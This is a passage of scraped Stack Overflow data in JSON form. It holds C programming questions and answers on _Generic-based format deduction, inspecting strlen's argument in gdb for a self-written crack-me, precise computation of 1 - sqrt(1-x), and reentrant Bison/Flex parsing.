"https://stackoverflow.com/questions/44662078/deduce-format-specifier-from-data-type/44663207#44663207", "title": "Deduce format specifier from data type?", "body": "<blockquote>\n  <p>Is it possible to deduce the format specifier programmatically  for a data type?</p>\n</blockquote>\n\n<p>Not easily nor directly with <code>printf()</code>, yet...</p>\n\n<p>Yes, with limitations to a select set of types, by using of <code>_Generic</code>.  </p>\n\n<p>This could be done various ways and used with <code>*printf()</code> with great dificulty, yet I found a similar approach to print data, without specifying individual format specifiers in this example:<br>\n<a href=\"https://codereview.stackexchange.com/q/115143/29485\">Formatted print without the need to specify type matching specifiers using _Generic</a><br>\nNote: This code has a coding hole concerning pointer math, that I have since patched - though not posted.</p>\n\n<pre><code>GPrintf(\"Name is \", GP(name), \" is \", GP(dob), GP_eol);\n</code></pre>\n\n<p>The key was to use <code>_Generic(parameter)</code> to steer the selection of the code used to convert the type to text by having the macro <code>GP(x)</code> expand to 2 parts: a string and <code>x</code>.  Then  <code>GPrintf()</code> interprets the arguments.<br>\nThis is akin to <a href=\"https://stackoverflow.com/questions/44662078/deduce-format-specifier-from-data-type/44663207#comment76310026_44662078\">@Micha\u00ebl Roy</a>'s comment, yet staying in C rather than C++.</p>\n"}], "owner": {"reputation": 1664, "user_id": 1851678, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/bdcff1b7cdb4a88526e436ad7550c9a4?s=128&d=identicon&r=PG", "display_name": "Zoso", "link": "https://stackoverflow.com/users/1851678/zoso"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 185, "favorite_count": 0, "accepted_answer_id": 44662164, "answer_count": 2, "score": 3, "last_activity_date": 1497996361, "creation_date": 1497989043, "last_edit_date": 1497989445, "question_id": 44662078, "link": "https://stackoverflow.com/questions/44662078/deduce-format-specifier-from-data-type", "title": "Deduce format specifier from data type?", "body": "<p>Is it possible to deduce the format specifier programmatically for a data type? For instance if the print is for a long it automatically does something like:</p>\n\n<pre><code>printf(\"Vlaue of var is &lt;fmt_spec&gt; \", var);\n</code></pre>\n\n<p>I also feel it would reduce some errors on part of developer since something like</p>\n\n<pre><code>printf(\"Name is %s\",int_val); //Oops, int_val would be treated as an address\n\nprintf(\"Name is %s, DOB is\",name,dob); // missed %d for dob\n\nprintf(\"Name is %s DOB is %d\", name);//Missed printing DOB\n</code></pre>\n\n<p>I understand that the latter two do have warnings but wouldn't it be better if errors were thrown since in most cases it is going to be problematic? Or am I missing something or are there constructs already in place to do so ?</p>\n"}, {"tags": ["c", "debugging", "assembly", "gdb", "reverse-engineering"], "comments": [{"owner": {"reputation": 1221, "user_id": 6210312, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/kWA1n.png?s=128&g=1", "display_name": "Lacobus", "link": "https://stackoverflow.com/users/6210312/lacobus"}, "edited": false, "score": 1, "creation_date": 1497989796, "post_id": 44661951, "comment_id": 76310099, "body": "check this out: <a href=\"https://stackoverflow.com/questions/29955609/include-source-code-of-malloc-c-in-gdb\" title=\"include source code of malloc c in gdb\">stackoverflow.com/questions/29955609/&hellip;</a>"}, {"owner": {"reputation": 107, "user_id": 3917820, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3d06e07252c080264e0f44b35bf770b6?s=128&d=identicon&r=PG&f=1", "display_name": "shamba", "link": "https://stackoverflow.com/users/3917820/shamba"}, "edited": false, "score": 0, "creation_date": 1497990710, "post_id": 44661951, "comment_id": 76310589, "body": "The answer already appears in your log, the instruction call 0x8048384 &lt;strlen@plt&gt; means that there is a syscall made to strlen with argument stored at the address 0x8048384 (in the stack). You have to examine the stack from address 0x8048384 until you find &#39;\\0&#39; to get the argument passed to strlen."}, {"owner": {"reputation": 5484, "user_id": 3580433, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/u2X2X.jpg?s=128&g=1", "display_name": "Abraham", "link": "https://stackoverflow.com/users/3580433/abraham"}, "reply_to_user": {"reputation": 107, "user_id": 3917820, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3d06e07252c080264e0f44b35bf770b6?s=128&d=identicon&r=PG&f=1", "display_name": "shamba", "link": "https://stackoverflow.com/users/3917820/shamba"}, "edited": false, "score": 3, "creation_date": 1497992346, "post_id": 44661951, "comment_id": 76311459, "body": "@shamba No, <code>0x8048384</code> is address of start of the <code>strlen</code> function."}, {"owner": {"reputation": 52454, "user_id": 547981, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/90042f6f33a9f87769fac02096ceea68?s=128&d=identicon&r=PG", "display_name": "Jester", "link": "https://stackoverflow.com/users/547981/jester"}, "edited": false, "score": 3, "creation_date": 1497994478, "post_id": 44661951, "comment_id": 76312385, "body": "<code>x&#47;s $eax</code> (or is it <code>p&#47;s</code>?)"}, {"owner": {"reputation": 5484, "user_id": 3580433, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/u2X2X.jpg?s=128&g=1", "display_name": "Abraham", "link": "https://stackoverflow.com/users/3580433/abraham"}, "reply_to_user": {"reputation": 52454, "user_id": 547981, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/90042f6f33a9f87769fac02096ceea68?s=128&d=identicon&r=PG", "display_name": "Jester", "link": "https://stackoverflow.com/users/547981/jester"}, "edited": false, "score": 0, "creation_date": 1497995345, "post_id": 44661951, "comment_id": 76312746, "body": "@Jester <code>x&#47;s $eax</code>. Thanks. Another question appeared here! How does $eax can contains strings larger than eax size? And where does second and third , ... arguments stored? (if any)"}, {"owner": {"reputation": 52454, "user_id": 547981, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/90042f6f33a9f87769fac02096ceea68?s=128&d=identicon&r=PG", "display_name": "Jester", "link": "https://stackoverflow.com/users/547981/jester"}, "edited": false, "score": 4, "creation_date": 1497995912, "post_id": 44661951, "comment_id": 76312951, "body": "<code>eax</code> just holds a pointer to the string (do you know C?). Note that actually the arguments are in memory on the stack at <code>[esp]</code>, just that in this piece of code it&#39;s also in <code>eax</code> so it was more convenient than having to read it from the stack."}], "owner": {"reputation": 5484, "user_id": 3580433, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/u2X2X.jpg?s=128&g=1", "display_name": "Abraham", "link": "https://stackoverflow.com/users/3580433/abraham"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1455, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1497988883, "creation_date": 1497988610, "last_edit_date": 1497988883, "question_id": 44661951, "link": "https://stackoverflow.com/questions/44661951/how-to-retrieve-arguments-of-a-function-in-gdb", "title": "How to retrieve arguments of a function in gdb?", "body": "<p>I wrote a simple crack-me program. You see the assembly code of a function named <code>check</code> inside this program:</p>\n\n<pre><code>(gdb) disassemble check \nDump of assembler code for function check:\n   0x08048484 &lt;+0&gt;: push   ebp\n   0x08048485 &lt;+1&gt;: mov    ebp,esp\n   0x08048487 &lt;+3&gt;: sub    esp,0x28\n   0x0804848a &lt;+6&gt;: mov    DWORD PTR [ebp-0x8],0x0\n   0x08048491 &lt;+13&gt;:    mov    DWORD PTR [ebp-0xc],0x0\n   0x08048498 &lt;+20&gt;:    mov    eax,DWORD PTR [ebp+0x8]\n   0x0804849b &lt;+23&gt;:    mov    DWORD PTR [esp],eax\n   0x0804849e &lt;+26&gt;:    call   0x8048384 &lt;strlen@plt&gt;      &lt;&lt;&lt;&lt;&lt;&lt; Here!\n   0x080484a3 &lt;+31&gt;:    cmp    DWORD PTR [ebp-0xc],eax\n   0x080484a6 &lt;+34&gt;:    jae    0x80484fb &lt;check+119&gt;\n   0x080484a8 &lt;+36&gt;:    mov    eax,DWORD PTR [ebp-0xc]\n   0x080484ab &lt;+39&gt;:    add    eax,DWORD PTR [ebp+0x8]\n   0x080484ae &lt;+42&gt;:    movzx  eax,BYTE PTR [eax]\n   0x080484b1 &lt;+45&gt;:    mov    BYTE PTR [ebp-0xd],al\n   0x080484b4 &lt;+48&gt;:    lea    eax,[ebp-0x4]\n   0x080484b7 &lt;+51&gt;:    mov    DWORD PTR [esp+0x8],eax\n   0x080484bb &lt;+55&gt;:    mov    DWORD PTR [esp+0x4],0x8048638\n   0x080484c3 &lt;+63&gt;:    lea    eax,[ebp-0xd]\n   0x080484c6 &lt;+66&gt;:    mov    DWORD PTR [esp],eax\n   0x080484c9 &lt;+69&gt;:    call   0x80483a4 &lt;sscanf@plt&gt;\n   0x080484ce &lt;+74&gt;:    mov    edx,DWORD PTR [ebp-0x4]\n   0x080484d1 &lt;+77&gt;:    lea    eax,[ebp-0x8]\n   0x080484d4 &lt;+80&gt;:    add    DWORD PTR [eax],edx\n   0x080484d6 &lt;+82&gt;:    cmp    DWORD PTR [ebp-0x8],0xf\n   0x080484da &lt;+86&gt;:    jne    0x80484f4 &lt;check+112&gt;\n   0x080484dc &lt;+88&gt;:    mov    DWORD PTR [esp],0x804863b\n   0x080484e3 &lt;+95&gt;:    call   0x8048394 &lt;printf@plt&gt;\n   0x080484e8 &lt;+100&gt;:   mov    DWORD PTR [esp],0x0\n   0x080484ef &lt;+107&gt;:   call   0x80483b4 &lt;exit@plt&gt;\n   0x080484f4 &lt;+112&gt;:   lea    eax,[ebp-0xc]\n   0x080484f7 &lt;+115&gt;:   inc    DWORD PTR [eax]\n   0x080484f9 &lt;+117&gt;:   jmp    0x8048498 &lt;check+20&gt;\n   0x080484fb &lt;+119&gt;:   mov    DWORD PTR [esp],0x8048649\n   0x08048502 &lt;+126&gt;:   call   0x8048394 &lt;printf@plt&gt;\n   0x08048507 &lt;+131&gt;:   leave  \n   0x08048508 &lt;+132&gt;:   ret \n</code></pre>\n\n<p>As you see above, inside the <code>check</code> function, there is a function call to <code>strlen</code>. The question is how can I see the string that is passed to <code>strlen()</code>?</p>\n"}, {"tags": ["c++", "c", "math", "precision", "sqrt"], "comments": [{"owner": {"reputation": 96886, "user_id": 2296458, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/wbG2s.png?s=128&g=1", "display_name": "Cory Kramer", "link": "https://stackoverflow.com/users/2296458/cory-kramer"}, "edited": false, "score": 4, "creation_date": 1497987994, "post_id": 44661725, "comment_id": 76309105, "body": "<i>&quot;for computing 1 - exp(x) &quot;</i>... then you read backwards :) it is for computing <code>exp(x) - 1</code>"}, {"owner": {"reputation": 292363, "user_id": 37213, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/eeec80237213c91e5bab56b77ac5b8ca?s=128&d=identicon&r=PG", "display_name": "duffymo", "link": "https://stackoverflow.com/users/37213/duffymo"}, "edited": false, "score": 0, "creation_date": 1497990108, "post_id": 44661725, "comment_id": 76310252, "body": "A search of SO would have helped you: <a href=\"https://stackoverflow.com/questions/8721022/how-to-improve-fixed-point-square-root-for-small-values\" title=\"how to improve fixed point square root for small values\">stackoverflow.com/questions/8721022/&hellip;</a>"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1497995239, "post_id": 44661725, "comment_id": 76312700, "body": "How is <code>double foo(double x) { return 1 - sqrt(x); }</code> not sufficient for your needs with small <code>x</code>?"}, {"owner": {"reputation": 13, "user_id": 5150084, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/5003fb0ed5a8a9261dd3b329fd1514e7?s=128&d=identicon&r=PG", "display_name": "zjw518", "link": "https://stackoverflow.com/users/5150084/zjw518"}, "reply_to_user": {"reputation": 292363, "user_id": 37213, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/eeec80237213c91e5bab56b77ac5b8ca?s=128&d=identicon&r=PG", "display_name": "duffymo", "link": "https://stackoverflow.com/users/37213/duffymo"}, "edited": false, "score": 1, "creation_date": 1497997349, "post_id": 44661725, "comment_id": 76313405, "body": "@duffymo - that would be because I mis-stated the question. I meant 1 - sqrt(1-x). Should I repost the question or edit this one?"}, {"owner": {"reputation": 19034, "user_id": 780717, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/eead3a6ab011b880ca6ec354ca00f0b3?s=128&d=identicon&r=PG", "display_name": "njuffa", "link": "https://stackoverflow.com/users/780717/njuffa"}, "edited": false, "score": 0, "creation_date": 1504672811, "post_id": 44661725, "comment_id": 79094287, "body": "@zjw518 Some libraries (notably Boost) offer a function <code>sqrt1pm1()</code> that computes sqrt(x+1)-1, which should be suitable for your purposes, since 1 - sqrt(1-x) = - sqrt1pm1(-x). You could always create a reasonable implementation yourself: <code>double sqrt1pm1 (double a) { return a &#47; (1.0 + sqrt (a + 1.0)); }</code>"}], "answers": [{"comments": [{"owner": {"reputation": 19034, "user_id": 780717, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/eead3a6ab011b880ca6ec354ca00f0b3?s=128&d=identicon&r=PG", "display_name": "njuffa", "link": "https://stackoverflow.com/users/780717/njuffa"}, "edited": false, "score": 0, "creation_date": 1504672253, "post_id": 44661914, "comment_id": 79094149, "body": "Note that 1 - exp(x) =  - expm1(x), so expm1() is in fact well suited for this computation."}, {"owner": {"reputation": 19034, "user_id": 780717, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/eead3a6ab011b880ca6ec354ca00f0b3?s=128&d=identicon&r=PG", "display_name": "njuffa", "link": "https://stackoverflow.com/users/780717/njuffa"}, "edited": false, "score": 0, "creation_date": 1504674535, "post_id": 44661914, "comment_id": 79094778, "body": "You stated: &quot;It&#39;s the other way around&quot;, which I took as a <i>contradiction</i> to &quot;expm1 .. is suited for computing 1 - exp(x).&quot;"}, {"owner": {"reputation": 19034, "user_id": 780717, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/eead3a6ab011b880ca6ec354ca00f0b3?s=128&d=identicon&r=PG", "display_name": "njuffa", "link": "https://stackoverflow.com/users/780717/njuffa"}, "edited": false, "score": 1, "creation_date": 1504674921, "post_id": 44661914, "comment_id": 79094900, "body": "I am familiar with the problem: posting before the first cup of coffee is not advised :-)"}], "tags": [], "owner": {"reputation": 66610, "user_id": 2411320, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/5kF5N.jpg?s=128&g=1", "display_name": "gsamaras", "link": "https://stackoverflow.com/users/2411320/gsamaras"}, "is_accepted": false, "score": 1, "last_activity_date": 1504674698, "last_edit_date": 1504674698, "creation_date": 1497988424, "answer_id": 44661914, "question_id": 44661725, "link": "https://stackoverflow.com/questions/44661725/computing-1-sqrtx-for-small-argument-x-10-12-similar-to-expm1-in-c-c/44661914#44661914", "title": "Computing 1 - sqrt(x) for small argument x (~10^-12) similar to expm1 (in C/C++)", "body": "<blockquote>\n  <p>the <code>expm1</code> function is suited for computing 1 - exp(x).</p>\n</blockquote>\n\n<p>As can read in the <a href=\"http://www.cplusplus.com/reference/cmath/expm1/\" rel=\"nofollow noreferrer\">ref</a>:</p>\n\n<blockquote>\n  <p>For small magnitude values of x, <code>expm1</code> may be more accurate than <code>exp(x)-1</code>.</p>\n</blockquote>\n\n<hr>\n\n<blockquote>\n  <p>Is there such a function for 1 - sqrt(x)?</p>\n</blockquote>\n\n<p>No, at least not in the standard headers.</p>\n"}, {"comments": [{"owner": {"reputation": 2663, "user_id": 6301420, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/9f4693f2fcba86b5f59737b94120acc2?s=128&d=identicon&r=PG&f=1", "display_name": "Daniel Schepler", "link": "https://stackoverflow.com/users/6301420/daniel-schepler"}, "edited": false, "score": 6, "creation_date": 1497991658, "post_id": 44662010, "comment_id": 76311123, "body": "Or, you could use <code>x &#47; (sqrt(1+x) + 1)</code> which is algebraically equivalent to <code>sqrt(1+x) - 1</code> but doesn&#39;t have the cancellation artifacts for small <code>x</code>."}, {"owner": {"reputation": 13, "user_id": 5150084, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/5003fb0ed5a8a9261dd3b329fd1514e7?s=128&d=identicon&r=PG", "display_name": "zjw518", "link": "https://stackoverflow.com/users/5150084/zjw518"}, "edited": false, "score": 1, "creation_date": 1497997741, "post_id": 44662010, "comment_id": 76313545, "body": "You are correct, @jwimberley, I meant <code>1 - sqrt(1-x)</code>. My intent is to have a function which works for x as small as 10^-12 up to 1. I did a poor job phrasing the question (I confused myself after reading about <code>expm1</code>). I currently have ~20 terms in the expansion to be safe, so that I can switch to using <code>sqrt</code> at x~.01 - it would be great if a function existed that encapsulates this (and is faster, of course). Though Daniel&#39;s suggestion looks promising."}, {"owner": {"reputation": 1568, "user_id": 5526072, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/588896494e8fd23bb0092474a5cf958d?s=128&d=identicon&r=PG", "display_name": "jwimberley", "link": "https://stackoverflow.com/users/5526072/jwimberley"}, "reply_to_user": {"reputation": 2663, "user_id": 6301420, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/9f4693f2fcba86b5f59737b94120acc2?s=128&d=identicon&r=PG&f=1", "display_name": "Daniel Schepler", "link": "https://stackoverflow.com/users/6301420/daniel-schepler"}, "edited": false, "score": 0, "creation_date": 1497998072, "post_id": 44662010, "comment_id": 76313640, "body": "You can modify either of our suggestions to your purpose. @DanielSchepler&#39;s is probably better: just compute -x/(1+sqrt(1-x)) in that order. This is equal to x*(1-sqrt(1-x))/(1-(1-x)) = 1-sqrt(1-x), but doesn&#39;t rely on cancellation to achieve accuracy."}, {"owner": {"reputation": 1568, "user_id": 5526072, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/588896494e8fd23bb0092474a5cf958d?s=128&d=identicon&r=PG", "display_name": "jwimberley", "link": "https://stackoverflow.com/users/5526072/jwimberley"}, "edited": false, "score": 0, "creation_date": 1497998435, "post_id": 44662010, "comment_id": 76313757, "body": "(My -x in the above comment a typo)"}], "tags": [], "owner": {"reputation": 1568, "user_id": 5526072, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/588896494e8fd23bb0092474a5cf958d?s=128&d=identicon&r=PG", "display_name": "jwimberley", "link": "https://stackoverflow.com/users/5526072/jwimberley"}, "is_accepted": true, "score": 5, "last_activity_date": 1497989775, "last_edit_date": 1497989775, "creation_date": 1497988817, "answer_id": 44662010, "question_id": 44661725, "link": "https://stackoverflow.com/questions/44661725/computing-1-sqrtx-for-small-argument-x-10-12-similar-to-expm1-in-c-c/44662010#44662010", "title": "Computing 1 - sqrt(x) for small argument x (~10^-12) similar to expm1 (in C/C++)", "body": "<p>The question here seems badly motivated. While exp(x) converges to 1 as x goes to 0, meaning that given the same floating point precision exp(x)-1 has more significant figures than exp(x) for small x, this is not true for sqrt(x), which converges to 0 as x goes to 0. In other words exp(x)-1 can be made fractionally more precise than exp(x) for small x, but the same is not true for 1-sqrt(x) -- which would in fact get worse, since you're taking it from something near 0 (1e-6) to something near 1 (0.999999).</p>\n\n<p>If on the other hand you instead wanted to calculate sqrt(1+x) for very small x (as an accurate measurement of sqrt(x) very near x=1), sqrt(1+x)-1 would be a more accurate floating point computation. And its Taylor series would work very well; I find that for |x| &lt; 1e-9, x/2 - x^2/8 + x^3/16 is a good approximation of sqrt(1+x)-1 to within an RMS fractional error of 3e-29 (with a maximum of 8e-29 on the edges) -- twice as many digits as are accurate in a double. Even the quadratic approximation is probably good enough (with roughly 20 digits of accuracy)</p>\n"}], "owner": {"reputation": 13, "user_id": 5150084, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/5003fb0ed5a8a9261dd3b329fd1514e7?s=128&d=identicon&r=PG", "display_name": "zjw518", "link": "https://stackoverflow.com/users/5150084/zjw518"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 229, "favorite_count": 0, "accepted_answer_id": 44662010, "answer_count": 2, "score": 1, "last_activity_date": 1504674698, "creation_date": 1497987701, "last_edit_date": 1497997822, "question_id": 44661725, "link": "https://stackoverflow.com/questions/44661725/computing-1-sqrtx-for-small-argument-x-10-12-similar-to-expm1-in-c-c", "title": "Computing 1 - sqrt(x) for small argument x (~10^-12) similar to expm1 (in C/C++)", "body": "<p>I <a href=\"http://en.cppreference.com/w/cpp/numeric/math/expm1\" rel=\"nofollow noreferrer\">read</a> that the <code>expm1</code> function is suited for computing 1 - exp(x) for small x, without losing precision from truncation of 1.0 at ~15 digits (for doubles). Is there such a function for 1 - sqrt(x)? At the moment I am simply using a very large Taylor expansion, because I require as many (preferably all) digits of precision as doubles/long doubles can offer.</p>\n\n<p>Edit: I badly confused my intention here: I am looking to compute <code>1 - sqrt(1-x)</code> for <code>x</code> anywhere between 10^-12 and 1.</p>\n"}, {"tags": ["c", "bison", "flex-lexer", "yacc"], "answers": [{"comments": [{"owner": {"reputation": 574, "user_id": 5639712, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/537518938b29f95cfbabcf9c97bbe9c2?s=128&d=identicon&r=PG&f=1", "display_name": "Marco", "link": "https://stackoverflow.com/users/5639712/marco"}, "edited": false, "score": 0, "creation_date": 1498168787, "post_id": 44663290, "comment_id": 76402884, "body": "Thanks, it was easier than I expected. I used the manual function reference and I&#39;ve created a simple stack with functions <code>yypush_buffer_state(yy_create_buffer( yyin, YY_BUF_SIZE ));</code> to push and <code>yypop_buffer_state();</code> to pop. This worked, maintaining <code>stdin</code> at the bottom of the stack, and recovering OK after read a bunch of files."}], "tags": [], "owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "is_accepted": true, "score": 2, "last_activity_date": 1498001326, "last_edit_date": 1498001326, "creation_date": 1497994044, "answer_id": 44663290, "question_id": 44661663, "link": "https://stackoverflow.com/questions/44661663/swap-between-stdin-and-file-in-bison/44663290#44663290", "title": "Swap between stdin and file in Bison", "body": "<p>It's not too difficult to create a parser and a scanner which can be called recursively. (See below for an example.) But neither the default bison-generated parser nor the flex-generated scanner are designed to be reentrant. So with the default parser/scanner, you shouldn't call <code>yyparse()</code> inside <code>SetStandardInput</code>, because that function is itself called by <code>yyparse</code>. </p>\n\n<p>If you had a recursive parser and scanner, on the other hand, you could significantly simplify your logic. You could get rid of the <code>END</code> token (which is, in any case, practically never a good idea) and just recursively call <code>yyparse</code> in your action for <code>EVAL CLOSED_STRING '\\n'</code>.</p>\n\n<p>If you want to use the default parser and scanner, then your best solution is to use Flex's buffer stack to push and later pop a \"buffer\" corresponding to the file to be evaluated. (The word \"buffer\" here is a bit confusing, I think. A Flex \"buffer\" is actually an input source, such as a file; it's called a buffer because only a part of it is in memory, but Flex will read the entire input source as part of processing a \"buffer\".)</p>\n\n<p>You can read about the buffer stack usage in the <a href=\"http://westes.github.io/flex/manual/Multiple-Input-Buffers.html#Multiple-Input-Buffers\" rel=\"nofollow noreferrer\">flex manual</a>, which includes sample code. Note that in the sample code, the end of file condition is entirely handled inside the scanner, which is usual for this architecture. </p>\n\n<p>It is possible in this case to manufacture an end-of-file indicator (although you cannot use <code>END</code> because that is used to indicate the end of all input). That has the advantage of ensuring that the contents of the evaluated file are parsed as a whole, without leaking a partial parse back to the including file, but you will still want to pop the buffer stack inside the scanner because it annoyingly tricky to get end-of-file handling correct without violating any of the API constraints (one of which is that you cannot reliably read EOF twice on the same \"buffer\").</p>\n\n<p>In this case, I would recommend generating a reentrant parser and scanner and simply doing a recursive call. It's a clean and simple solution, and avoiding global variables is always good.</p>\n\n<p>A simple example. The simple language below only has <code>echo</code> and <code>eval</code> statements, both of which require a quoted string argument.</p>\n\n<p>There are a variety of ways to hook together a reentrant scanner and reentrant parser. All of them have some quirks and the documentation (although definitely worth reading) has some holes. This is a solution which I've found useful. Note that most of the externally visible functions are defined in the scanner file, because they rely on interfaces defined in that file for manipulating the reentrant scanner context object. You can get flex to export a header with the approriate definitions, but I've generally found it simpler to write my own wrapper functions and export those. (I don't usually export <code>yyscan_t</code> either; normally I create a context object of my own which has a <code>yyscan_t</code> member.)</p>\n\n<p>There is an annoying circularity which is largely the result of bison not allowing for the possibility to introduce user code at the top of <code>yyparse</code>. Consequently, it is necessary to pass the <code>yyscan_t</code> used to call the lexer as an argument to <code>yyparse</code>, which means that it is necessary to declare <code>yyscan_t</code> in the bison file. <code>yyscan_t</code> is actually declared in the scanner generated file (or the flex-generated header, if you've asked for one), but you can't include the flex-generated header in the bison-generated header because the flex-generated header requires <code>YYSTYPE</code> which is declared in the bison-generated header.</p>\n\n<p>I normally avoid this circularity by using a push parser, but that's pushing the boundaries for this question, so I just resorted to the usual work-around, which is to insert</p>\n\n<pre><code>typedef void* yyscan_t;\n</code></pre>\n\n<p>in the bison file. (That's the actual definition of <code>yyscan_t</code>, whose actual contents are supposed to be opaque.)</p>\n\n<p>I hope the rest of the example is self-evident, but please feel free to ask for clarification if there is anything which you don't understand.</p>\n\n<h3>file recur.l</h3>\n\n<pre><code>%{\n  #include &lt;stdio.h&gt;\n  #include &lt;stdlib.h&gt;\n  #include &lt;string.h&gt;\n  #include \"recur.tab.h\"\n%}\n\n%option reentrant bison-bridge \n%option noinput nounput nodefault noyywrap\n%option yylineno\n\n%%\n\"echo\"       { return T_ECHO; }\n\"eval\"       { return T_EVAL; }\n[[:alpha:]][[:alnum:]]*  {\n               yylval-&gt;text = strdup(yytext);\n               return ID;\n             }\n[\"]          { yyerror(yyscanner, \"Unterminated string constant\"); }\n[\"][^\"\\n]*[\"] {\n               yylval-&gt;text = malloc(yyleng - 1);\n               memcpy(yylval-&gt;text, yytext + 1, yyleng - 2);\n               yylval-&gt;text[yyleng - 2] = '\\0';\n               return STRING;\n             }\n\".\"          { return yytext[0]; }\n[[:digit:]]*(\".\"[[:digit:]]*)? {\n               yylval-&gt;number = strtod(yytext, NULL);\n               return NUMBER;\n             }\n[ \\t]+       ;\n.|\\n         { return yytext[0]; }\n\n%%\n/* Use \"-\" or NULL to parse stdin */\nint parseFile(const char* path) {\n  FILE* in = stdin;\n  if (path &amp;&amp; strcmp(path, \"-\") != 0) {\n    in = fopen(path, \"r\");\n    if (!in) {\n      fprintf(stderr, \"Could not open file '%s'\\n\", path);\n      return 1;\n    }\n  }\n  yyscan_t scanner;\n  yylex_init (&amp;scanner);\n  yyset_in(in, scanner);\n  int rv = yyparse(scanner);\n  yylex_destroy(scanner);\n  if (in != stdin) fclose(in);\n  return rv;\n}\nvoid yyerror(yyscan_t yyscanner, const char* msg) {\n  fprintf(stderr, \"At line %d: %s\\n\", yyget_lineno(yyscanner), msg);\n}\n</code></pre>\n\n<h2>file recur.y</h2>\n\n<pre><code>%code {\n  #include &lt;stdio.h&gt;\n}\n%define api.pure full\n%param { scanner_t context }\n%union {\n  char*  text;\n  double number;\n}\n%code requires {\n  int parseFILE(FILE* in);\n}\n%token ECHO \"echo\" EVAL \"eval\"\n%token STRING ID NUMBER\n%%\nprogram: %empty | program command '\\n'\ncommand: echo | eval | %empty\necho: \"echo\" STRING  { printf(\"%s\\n\", $2); }\neval: \"eval\" STRING  { FILE* f = fopen($2, \"r\");\n                       if (f) {\n                         parseFILE(f);\n                         close(f);\n                       }\n                       else {\n                         fprintf(stderr, \"Could not open file '%s'\\n\",\n                                         $2);\n                         YYABORT;\n                       }\n                     }\n\n%%\n</code></pre>\n"}], "owner": {"reputation": 574, "user_id": 5639712, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/537518938b29f95cfbabcf9c97bbe9c2?s=128&d=identicon&r=PG&f=1", "display_name": "Marco", "link": "https://stackoverflow.com/users/5639712/marco"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1321, "favorite_count": 1, "accepted_answer_id": 44663290, "answer_count": 1, "score": 2, "last_activity_date": 1498001326, "creation_date": 1497987414, "last_edit_date": 1497992575, "question_id": 44661663, "link": "https://stackoverflow.com/questions/44661663/swap-between-stdin-and-file-in-bison", "title": "Swap between stdin and file in Bison", "body": "<p>I have the following code in Bison, which extends the <code>mfcalc</code> proposed in the guide, implementing some functions like <code>yylex()</code> externally with FLEX.</p>\n\n<p>To understand my problem, the key rules are in non-terminal token called <code>line</code> at the beginning of the grammar. Concretely, the rules <code>EVAL CLOSED_STRING '\\n'</code> and <code>END</code> (this token is sent by FLEX when EOF is detected. The first opens a file and points the input to that file. The second closes the file and points the input to <code>stdin</code> input.</p>\n\n<p>I'm trying to make a rule <code>eval \"file_path\"</code> to load tokens from a file and evaluate them. Initially I have <code>yyin = stdin</code> (I use the function <code>setStandardInput()</code> to do this). </p>\n\n<p>When a user introduces <code>eval \"file_path\"</code> the parser swaps <code>yyin</code>from <code>stdin</code> to the file pointer (with the function <code>setFileInput()</code>) and the tokens are readen correctly. </p>\n\n<p>When the <code>END</code> rule is reached by the parser, it tries to restore the <code>stdin</code> input but it gets bugged. This bug means the calculator doesn't ends but what I write in the input isn't evaluated.</p>\n\n<p>Note: I supposed there are no errors in the grammar, because error recovery it's not complete. In the file_path you can use simple arithmetic operations.</p>\n\n<p>As a summary, I want to swap among <code>stdin</code> and file pointers as inputs, but when I swap to <code>stdin</code> it gets bugged, except I start the calculator with <code>stdin</code> as default.</p>\n\n<pre><code>%{\n\n\n/* Library includes */\n\n#include &lt;stdio.h&gt;\n#include &lt;math.h&gt;\n#include 